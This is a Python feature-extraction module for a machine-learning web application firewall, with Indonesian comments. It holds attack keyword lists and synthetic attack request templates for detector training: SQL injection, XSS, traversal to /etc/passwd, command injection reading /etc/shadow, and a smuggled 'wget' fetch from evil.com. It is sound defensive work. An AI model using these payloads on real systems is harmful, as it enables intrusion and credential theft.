"""Modul ekstraksi fitur ML-WAF (DIPAKAI BERSAMA oleh training dan runtime mitmproxy).

Menjamin konsistensi fitur antara fase pelatihan model dan inferensi saat deteksi (zero train-serve skew).
Mendukung:
- Parsing dataset HTTP CSIC 2010 (raw HTTP format dan CSV Kaggle).
- Normalisasi URL decode berulang (maksimal 3 kali) dan lowercase.
- Ekstraksi 45+ fitur numerik tetap: frekuensi keyword serangan, karakter khusus, dan statistik request.
- Baseline rule-based detector untuk perbandingan performa.
- Generator dataset sintetis CSIC sebagai fallback jika data asli belum diunduh.
"""

from __future__ import annotations

import csv
import io
import re
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, unquote, urlparse


# ---------------------------------------------------------------------------
# Daftar Eksplisit Kata Kunci Serangan (Fixed Attack Keywords)
# ---------------------------------------------------------------------------
ATTACK_KEYWORDS: list[str] = [
    "select",
    "union",
    "insert",
    "update",
    "delete",
    "drop",
    "exec",
    "sleep",
    "benchmark",
    "or 1=1",
    "and 1=1",
    "script",
    "alert",
    "onerror",
    "onload",
    "javascript:",
    "<iframe",
    "../",
    "/etc/passwd",
    "cmd",
    "whoami",
    "cat",
    "wget",
    "curl",
    "; ls",
]

# Karakter khusus yang sering muncul dalam payload injeksi
SPECIAL_CHARS: list[str] = [
    "'",
    '"',
    ";",
    "--",
    "/*",
    "*/",
    "<",
    ">",
    "(",
    ")",
    "=",
    "%",
    "&",
    "|",
    "`",
    "$",
    "{",
    "}",
    "..",
]

# Pola regex tambahan untuk injeksi logika SQL
_RE_OR_11 = re.compile(r"\bor\s+('?1'?\s*=\s*'?1'?|true|'a'='a')", re.IGNORECASE)
_RE_AND_11 = re.compile(r"\band\s+('?1'?\s*=\s*'?1'?|true|'a'='a')", re.IGNORECASE)


# ---------------------------------------------------------------------------
# Normalizer Fungsi
# ---------------------------------------------------------------------------
def normalize(text: str | None) -> str:
    """Melakukan URL decode rekursif hingga 3 kali, ubah '+' menjadi spasi, dan huruf kecil."""
    if not text:
        return ""
    cur = str(text).replace("+", " ")
    for _ in range(3):
        unq = unquote(cur)
        if unq == cur:
            break
        cur = unq.replace("+", " ")
    return cur.strip().lower()


# ---------------------------------------------------------------------------
# Nama-Nama Fitur (Single Source of Truth)
# ---------------------------------------------------------------------------
def feature_names() -> list[str]:
    """Mengembalikan daftar nama fitur dengan urutan tetap."""
    names: list[str] = []

    # 1. Keyword frequencies
    for kw in ATTACK_KEYWORDS:
        sanitized = re.sub(r"[^a-zA-Z0-9_]", "_", kw)
        names.append(f"kw_{sanitized}")

    # 2. Special characters counts
    for sc in SPECIAL_CHARS:
        sanitized = (
            sc.replace("'", "single_quote")
            .replace('"', "double_quote")
            .replace(";", "semicolon")
            .replace("--", "dash_dash")
            .replace("/*", "slash_star")
            .replace("*/", "star_slash")
            .replace("<", "lt")
            .replace(">", "gt")
            .replace("(", "open_paren")
            .replace(")", "close_paren")
            .replace("=", "eq")
            .replace("%", "percent")
            .replace("&", "amp")
            .replace("|", "pipe")
            .replace("`", "backtick")
            .replace("$", "dollar")
            .replace("{", "open_brace")
            .replace("}", "close_brace")
            .replace("..", "dot_dot")
        )
        names.append(f"char_{sanitized}")

    # 3. Structural & Statistical features
    names.extend([
        "len_url",
        "len_query",
        "len_body",
        "total_len",
        "num_params",
        "non_alphanumeric_ratio",
        "is_post",
        "is_get",
    ])
    return names


# ---------------------------------------------------------------------------
# Ekstraktor Fitur Numerik
# ---------------------------------------------------------------------------
def extract_features(
    method: str,
    url: str,
    query: str = "",
    body: str = "",
) -> list[float]:
    """Ekstraksi vektor fitur numerik tetap dari suatu permintaan HTTP."""
    method_upper = (method or "GET").upper()
    norm_url = normalize(url)
    norm_query = normalize(query)
    norm_body = normalize(body)

    # Gabungan teks permintaan yang dinormalisasi untuk pencarian kata kunci
    full_text = f"{norm_url} {norm_query} {norm_body}".strip()
    total_len = len(norm_url) + len(norm_query) + len(norm_body)

    features: list[float] = []

    # 1. Frekuensi Keyword Serangan
    for kw in ATTACK_KEYWORDS:
        if kw == "or 1=1":
            cnt = len(_RE_OR_11.findall(full_text)) + full_text.count("or 1=1")
        elif kw == "and 1=1":
            cnt = len(_RE_AND_11.findall(full_text)) + full_text.count("and 1=1")
        else:
            cnt = full_text.count(kw.lower())
        features.append(float(cnt))

    # 2. Jumlah Karakter Khusus
    for sc in SPECIAL_CHARS:
        cnt = full_text.count(sc)
        features.append(float(cnt))

    # 3. Fitur Struktural & Statistik
    len_url = float(len(norm_url))
    len_query = float(len(norm_query))
    len_body = float(len(norm_body))
    features.append(len_url)
    features.append(len_query)
    features.append(len_body)
    features.append(float(total_len))

    # Hitung jumlah parameter (dari query string dan POST body form)
    num_query_params = len(parse_qs(norm_query, keep_blank_values=True)) if norm_query else 0
    num_body_params = len(parse_qs(norm_body, keep_blank_values=True)) if ("=" in norm_body and "&" in norm_body) else (1 if "=" in norm_body else 0)
    features.append(float(num_query_params + num_body_params))

    # Rasio karakter non-alfanumerik
    if total_len > 0:
        non_alnum_count = len(re.findall(r"[^a-zA-Z0-9\s]", full_text))
        ratio = float(non_alnum_count) / float(total_len)
    else:
        ratio = 0.0
    features.append(round(ratio, 4))

    # One-hot sederhana method
    features.append(1.0 if method_upper == "POST" else 0.0)
    features.append(1.0 if method_upper == "GET" else 0.0)

    return features


# ---------------------------------------------------------------------------
# Baseline Rule-Based Detector (Untuk Pembanding Akurasi Model ML)
# ---------------------------------------------------------------------------
def is_attack_baseline(method: str, url: str, query: str = "", body: str = "") -> int:
    """Detektor berbasis aturan heuristik sederhana:
    Blokir (1) jika mengandung minimal 1 kata kunci serangan atau pola injeksi umum.
    """
    full_text = f"{normalize(url)} {normalize(query)} {normalize(body)}"

    # Cek kata kunci
    for kw in ATTACK_KEYWORDS:
        if kw in ("or 1=1", "and 1=1"):
            if _RE_OR_11.search(full_text) or _RE_AND_11.search(full_text):
                return 1
        elif kw in full_text:
            return 1

    # Cek pola karakter khas serangan
    suspicious_patterns = ["<script", "../", "..\\", "exec(", "/etc/passwd", "' or '"]
    for pat in suspicious_patterns:
        if pat in full_text:
            return 1

    return 0


# ---------------------------------------------------------------------------
# Parser Raw HTTP Requests (CSIC 2010 Format & Kaggle CSV)
# ---------------------------------------------------------------------------
def _parse_raw_text(text: str) -> list[dict[str, Any]]:
    """Parse teks berisi raw HTTP requests yang dipisahkan baris kosong."""
    requests: list[dict[str, Any]] = []
    lines = text.splitlines()
    i = 0
    n = len(lines)

    while i < n:
        # Cari baris request line (GET/POST/PUT dll)
        line = lines[i].strip()
        if not line or not re.match(r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+", line, re.IGNORECASE):
            i += 1
            continue

        parts = line.split(" ")
        method = parts[0].upper()
        raw_url = parts[1] if len(parts) > 1 else "/"

        parsed_url = urlparse(raw_url)
        url_path = parsed_url.path or "/"
        query_str = parsed_url.query

        headers: dict[str, str] = {}
        i += 1

        # Baca headers hingga baris kosong
        content_length = 0
        while i < n and lines[i].strip():
            hline = lines[i].strip()
            if ":" in hline:
                hk, _, hv = hline.partition(":")
                hk_clean = hk.strip().lower()
                hv_clean = hv.strip()
                headers[hk_clean] = hv_clean
                if hk_clean == "content-length":
                    try:
                        content_length = int(hv_clean)
                    except ValueError:
                        pass
            i += 1

        # Lewati baris kosong antara headers dan body
        while i < n and not lines[i].strip():
            i += 1

        # Baca body jika ada
        body = ""
        if method in ("POST", "PUT") and i < n:
            body_lines = []
            while i < n and lines[i].strip() and not re.match(r"^(GET|POST|PUT|DELETE|HEAD|OPTIONS)\s+", lines[i].strip(), re.IGNORECASE):
                body_lines.append(lines[i].strip())
                i += 1
            body = "&".join(body_lines)

        requests.append({
            "method": method,
            "url": url_path,
            "query": query_str,
            "body": body,
            "headers": headers,
        })

    return requests


def parse_raw_requests(file_or_path: str | Path) -> list[dict[str, Any]]:
    """Membaca berkas dataset (baik raw HTTP CSIC .txt atau format .csv Kaggle)."""
    p = Path(file_or_path)
    if not p.exists():
        return []

    # Cek jika format CSV
    if p.suffix.lower() == ".csv":
        requests: list[dict[str, Any]] = []
        with open(p, "r", encoding="utf-8", errors="ignore") as f:
            reader = csv.DictReader(f)
            for row in reader:
                # Menangani berbagai nama kolom umum Kaggle
                method = row.get("Method") or row.get("method") or "GET"
                raw_url = row.get("URL") or row.get("url") or row.get("Path") or "/"
                query = row.get("query") or row.get("parameters") or ""
                body = row.get("body") or row.get("data") or row.get("content") or ""

                parsed = urlparse(raw_url)
                if not query and parsed.query:
                    query = parsed.query

                requests.append({
                    "method": method.upper(),
                    "url": parsed.path or raw_url,
                    "query": query,
                    "body": body,
                    "headers": {},
                    "label": int(row.get("classification") or row.get("label") or 0),
                })
        return requests

    # Format raw HTTP .txt
    text = p.read_text(encoding="utf-8", errors="ignore")
    return _parse_raw_text(text)


# ---------------------------------------------------------------------------
# Generator Dataset CSIC Sintetis (Fallback Verifikasi Pipeline)
# ---------------------------------------------------------------------------
def generate_synthetic_csic_dataset(target_dir: str | Path) -> dict[str, Path]:
    """Membuat sampel dataset CSIC sintetis jika file asli belum tersedia."""
    out_dir = Path(target_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    normal_train_file = out_dir / "normalTrafficTraining.txt"
    normal_test_file = out_dir / "normalTrafficTest.txt"
    anomalous_test_file = out_dir / "anomalousTrafficTest.txt"

    # Permintaan Normal (Benign)
    normal_templates = [
        ("GET", "http://localhost:8080/tienda1/index.jsp", "", ""),
        ("GET", "http://localhost:8080/tienda1/publico/productos.jsp?categoria=1", "categoria=1", ""),
        ("GET", "http://localhost:8080/tienda1/publico/carrito.jsp?item=10&qty=2", "item=10&qty=2", ""),
        ("GET", "http://localhost:8080/tienda1/mi_cuenta.jsp?user_id=105", "user_id=105", ""),
        ("GET", "http://localhost:8080/tienda1/articulos.jsp?page=2&order=asc", "page=2&order=asc", ""),
        ("POST", "http://localhost:8080/tienda1/login.jsp", "", "user=john_doe&pass=secret123"),
        ("POST", "http://localhost:8080/tienda1/checkout.jsp", "", "payment_method=cc&amount=150.00"),
        ("POST", "http://localhost:8080/tienda1/feedback.jsp", "", "rating=5&comment=Pelayanan+sangat+bagus"),
        ("POST", "http://localhost:8080/tienda1/register.jsp", "", "email=user%40test.com&username=usertest"),
    ]

    # Permintaan Serangan (Malicious)
    attack_templates = [
        ("GET", "http://localhost:8080/tienda1/index.jsp?id=1%27+or+1%3D1--", "id=1' or 1=1--", ""),
        ("GET", "http://localhost:8080/tienda1/search.jsp?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E", "q=<script>alert(1)</script>", ""),
        ("GET", "http://localhost:8080/tienda1/view.jsp?file=..%2F..%2F..%2Fetc%2Fpasswd", "file=../../../etc/passwd", ""),
        ("GET", "http://localhost:8080/tienda1/cat.jsp?id=1+union+select+null%2Cusername%2Cpassword+from+users", "id=1 union select null,username,password from users", ""),
        ("GET", "http://localhost:8080/tienda1/status.jsp?cmd=%3B+cat+%2Fetc%2Fshadow", "cmd=; cat /etc/shadow", ""),
        ("POST", "http://localhost:8080/tienda1/login.jsp", "", "user=admin%27+or+%271%27%3D%271&pass=any"),
        ("POST", "http://localhost:8080/tienda1/comment.jsp", "", "author=guest&text=%3Ciframe+src%3D%22javascript%3Aalert%281%29%22%3E"),
        ("POST", "http://localhost:8080/tienda1/exec.jsp", "", "action=backup&path=%3B+wget+http%3A%2F%2Fevil.com%2Fmal.sh"),
        ("POST", "http://localhost:8080/tienda1/api.jsp", "", "query=sleep%285%29&benchmark=1000000"),
    ]

    def _write_samples(file_path: Path, templates: list[tuple[str, str, str, str]], count: int):
        lines: list[str] = []
        lines.append("# SYNTHETIC CSIC DATASET FOR PIPELINE VERIFICATION")
        lines.append("")
        for idx in range(count):
            method, url_base, query, body = templates[idx % len(templates)]
            url = f"{url_base}&seed={idx}" if "?" in url_base else f"{url_base}?seed={idx}"
            lines.append(f"{method} {url} HTTP/1.1")
            lines.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            lines.append("Accept: text/html,application/xhtml+xml")
            lines.append("Host: localhost:8080")
            if method == "POST":
                lines.append("Content-Type: application/x-www-form-urlencoded")
                full_body = f"{body}&seq={idx}" if body else f"seq={idx}"
                lines.append(f"Content-Length: {len(full_body)}")
                lines.append("")
                lines.append(full_body)
            else:
                lines.append("")
            lines.append("")
        file_path.write_text("\n".join(lines), encoding="utf-8")

    _write_samples(normal_train_file, normal_templates, 600)
    _write_samples(normal_test_file, normal_templates, 200)
    _write_samples(anomalous_test_file, attack_templates, 400)

    return {
        "normal_train": normal_train_file,
        "normal_test": normal_test_file,
        "anomalous_test": anomalous_test_file,
    }
